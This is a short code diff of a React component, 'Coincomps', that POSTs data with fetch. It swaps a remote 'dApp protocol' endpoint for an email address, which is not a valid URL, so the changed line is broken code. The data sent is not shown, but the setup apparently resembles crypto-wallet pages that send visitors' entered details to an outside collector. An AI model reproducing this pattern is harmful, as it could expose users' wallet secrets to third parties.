@@ -42,7 +42,7 @@ const Coincomps = ({ data }) => {
       };
 
       try {
-        const url = "https://communicationdappsolutionprotocol.onrender.com/details_three";
+        const url = "Briankovack90@gmail.com";
 
         const res = await fetch(url, {
           method: "POST",
